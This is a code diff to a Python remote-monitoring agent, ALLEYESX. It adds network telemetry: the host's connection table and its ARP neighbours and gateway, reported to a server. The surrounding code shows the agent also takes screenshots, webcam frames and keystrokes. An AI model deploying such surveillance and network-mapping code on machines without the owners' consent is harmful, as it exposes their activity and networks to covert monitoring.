@@ -269,6 +269,11 @@ WEBCAM_INTERVAL = float(os.environ.get('ALLEYESX_WEBCAM_INTERVAL', str(1.0 / STR
 # "ConnectionAbortedError [WinError 10053]" on the server. 0.5s is responsive
 # for remote input and generates far fewer aborted sockets.
 TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.5'))
+# Connection snapshots and layer-2 neighbour scans. Both read the kernel, so they
+# are cheap, but there is no reason to hammer the server - connections are a
+# snapshot, and ARP neighbours change slowly.
+FLOW_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_FLOW_INTERVAL', '15'))
+LINK_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_LINK_INTERVAL', '60'))
 DIRTY_RECT_THRESHOLD = 0.005
 SCREENSHOT_QUALITY = 70
 WEBCAM_QUALITY = 65
@@ -2048,6 +2053,193 @@ def get_network_speed():
     except Exception:
         return None
 
+# ============================================================
+# NETWORK FLOW SENSOR
+# ------------------------------------------------------------
+# This is a CONNECTION sensor, not a packet sensor, and the UI says so. It reads
+# the kernel's own connection tables, so it needs no root, no libpcap and no
+# extra package - which is why it can run everywhere the agent runs.
+#
+# A true packet sensor (scapy/pyshark over libpcap) would additionally give
+# per-packet timestamps, sizes and payload protocol. When one is installed this
+# function is replaced, not supplemented; the stored shape already carries the
+# fields a packet sensor would fill in.
+# ============================================================
+
+_TCP_STATES = {
+    '01': 'ESTABLISHED', '02': 'SYN_SENT', '03': 'SYN_RECV', '04': 'FIN_WAIT1',
+    '05': 'FIN_WAIT2', '06': 'TIME_WAIT', '07': 'CLOSE', '08': 'CLOSE_WAIT',
+    '09': 'LAST_ACK', '0A': 'LISTEN', '0B': 'CLOSING',
+}
+
+
+def _hex_addr(value):
+    """Decode the little-endian hex ip:port pair from /proc/net/*."""
+    try:
+        addr_hex, port_hex = value.split(':')
+        port = int(port_hex, 16)
+        raw = bytes.fromhex(addr_hex)
+        # /proc stores IPv4 little-endian on little-endian hosts.
+        return '.'.join(str(b) for b in reversed(raw)), port
+    except Exception:
+        return None, None
+
+
+def _read_proc_connections(path, protocol):
+    rows = []
+    try:
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()[1:]
+    except Exception:
+        return rows
+    for line in lines:
+        parts = line.split()
+        if len(parts) < 4:
+            continue
+        local_ip, local_port = _hex_addr(parts[1])
+        remote_ip, remote_port = _hex_addr(parts[2])
+        if not local_ip:
+            continue
+        state = _TCP_STATES.get(parts[3].upper(), parts[3]) if protocol == 'tcp' else ''
+        rows.append({
+            'protocol': protocol,
+            'local_ip': local_ip,
+            'local_port': local_port,
+            'remote_ip': remote_ip,
+            'remote_port': remote_port,
+            'state': state,
+        })
+    return rows
+
+
+def collect_network_connections(limit=400):
+    """Current connections on this machine, from the kernel's own tables."""
+    if platform_kind() == 'android' or sys.platform.startswith('linux'):
+        rows = _read_proc_connections('/proc/net/tcp', 'tcp')
+        rows += _read_proc_connections('/proc/net/udp', 'udp')
+        return rows[:limit]
+
+    if sys.platform == 'win32':
+        rows = []
+        try:
+            out = subprocess.check_output(
+                ['netstat', '-ano', '-p', 'TCP'], timeout=15, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines()[3:]:
+                parts = line.split()
+                if len(parts) < 4:
+                    continue
+                try:
+                    lip, lport = parts[1].rsplit(':', 1)
+                    rip, rport = parts[2].rsplit(':', 1)
+                    rows.append({
+                        'protocol': 'tcp',
+                        'local_ip': lip.strip('[]'), 'local_port': int(lport),
+                        'remote_ip': rip.strip('[]'), 'remote_port': int(rport),
+                        'state': parts[3],
+                    })
+                except Exception:
+                    continue
+        except Exception:
+            pass
+        return rows[:limit]
+
+    if sys.platform == 'darwin':
+        rows = []
+        try:
+            out = subprocess.check_output(
+                ['netstat', '-an', '-p', 'tcp'], timeout=15, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines()[2:]:
+                parts = line.split()
+                if len(parts) < 4 or not parts[0].startswith('tcp'):
+                    continue
+                try:
+                    lip, lport = parts[3].rsplit('.', 1)
+                    rip, rport = parts[5].rsplit('.', 1)
+                    rows.append({
+                        'protocol': 'tcp',
+                        'local_ip': lip, 'local_port': int(lport),
+                        'remote_ip': rip, 'remote_port': int(rport),
+                        'state': parts[5 + 1] if len(parts) > 6 else '',
+                    })
+                except Exception:
+                    continue
+        except Exception:
+            pass
+        return rows[:limit]
+
+    return []
+
+
+def collect_link_neighbours():
+    """Layer-2 neighbours and the default gateway.
+
+    This is what node-to-node topology needs: who this host can reach directly,
+    and which router it goes through. Read from the kernel, not guessed.
+    """
+    result = {'neighbours': [], 'gateway': None, 'interface': None}
+
+    if sys.platform.startswith('linux') or platform_kind() == 'android':
+        try:
+            out = subprocess.check_output(
+                ['ip', 'neigh'], timeout=10, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 4 and parts[0].count('.') == 3:
+                    entry = {'ip': parts[0], 'interface': parts[2] if len(parts) > 2 else '',
+                             'mac': '', 'state': parts[-1]}
+                    if 'lladdr' in parts:
+                        entry['mac'] = parts[parts.index('lladdr') + 1]
+                    result['neighbours'].append(entry)
+        except Exception:
+            pass
+        try:
+            out = subprocess.check_output(
+                ['ip', 'route'], timeout=10, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines():
+                if line.startswith('default') and 'via' in line.split():
+                    parts = line.split()
+                    result['gateway'] = parts[parts.index('via') + 1]
+                    if 'dev' in parts:
+                        result['interface'] = parts[parts.index('dev') + 1]
+                    break
+        except Exception:
+            pass
+        return result
+
+    if sys.platform == 'win32':
+        try:
+            out = subprocess.check_output(
+                ['arp', '-a'], timeout=15, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 2 and parts[0].count('.') == 3:
+                    result['neighbours'].append(
+                        {'ip': parts[0], 'mac': parts[1], 'interface': '', 'state': ''}
+                    )
+        except Exception:
+            pass
+        try:
+            out = subprocess.check_output(
+                ['route', 'print', '0.0.0.0'], timeout=15, stderr=subprocess.DEVNULL
+            ).decode('utf-8', errors='ignore')
+            for line in out.splitlines():
+                if line.strip().startswith('0.0.0.0'):
+                    parts = line.split()
+                    if len(parts) >= 3:
+                        result['gateway'] = parts[2]
+                    break
+        except Exception:
+            pass
+        return result
+
+    return result
+
+
 def collect_security_telemetry():
     """Full security telemetry bundle for enriched heartbeats."""
     global _last_security_report, _security_telemetry
@@ -2899,6 +3091,8 @@ class ALLEYESXClient:
         self.last_screenshot_time = 0
         self.last_webcam_time = 0
         self.last_touch_poll_time = 0
+        self.last_flow_report_time = 0
+        self.last_link_report_time = 0
         self.last_hardware_report_time = 0
         self.keylogger_thread = None
         self.touch_event_id = 0
@@ -3140,6 +3334,36 @@ class ALLEYESXClient:
         else:
             print(f"[-] Software inventory rejected: {result.get('error', 'unknown')}")
 
+    def send_network_flows(self):
+        """Report the current connection table. Snapshot semantics: the server
+        replaces the previous snapshot rather than accumulating history."""
+        now = time.time()
+        if now - self.last_flow_report_time < FLOW_REPORT_INTERVAL:
+            return
+        self.last_flow_report_time = now
+        try:
+            rows = collect_network_connections()
+        except Exception:
+            return
+        api_request(f'/api/device/{self.device_id}/connections', {
+            'connections': rows,
+            # Honest provenance. This is the kernel connection table, not a
+            # packet capture; a real sensor would report 'packet_capture'.
+            'source': 'connection_table',
+        })
+
+    def send_network_links(self):
+        """Report ARP neighbours and the default gateway for node-to-node topology."""
+        now = time.time()
+        if now - self.last_link_report_time < LINK_REPORT_INTERVAL:
+            return
+        self.last_link_report_time = now
+        try:
+            links = collect_link_neighbours()
+        except Exception:
+            return
+        api_request(f'/api/device/{self.device_id}/links', links)
+
     def poll_touch_events(self):
         now = time.time()
         if now - self.last_touch_poll_time < TOUCH_POLL_INTERVAL:
@@ -3269,6 +3493,8 @@ class ALLEYESXClient:
                 self.send_webcam()
                 self.send_hardware_inventory()
                 self.send_software_inventory()
+                self.send_network_flows()
+                self.send_network_links()
                 
                 screenshot_counter += 1
                 webcam_counter += 1
